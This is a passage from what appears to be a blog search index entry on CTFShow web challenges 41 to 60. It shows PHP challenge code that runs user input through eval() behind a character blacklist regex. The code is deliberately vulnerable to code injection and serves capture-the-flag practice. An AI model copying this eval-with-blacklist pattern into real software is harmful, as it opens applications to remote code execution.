if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i\", $c)){\n        eval($c);\n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\n\n\nweb41web42web43web44web45web46web47web48web49web50web51web52web53web54web55web56web57web58web59web60","slug":"CTFShow","date":"2022-11-25T07:32:45.415Z","categories_index":"","tags_index":"","author_index":"Yum1"}]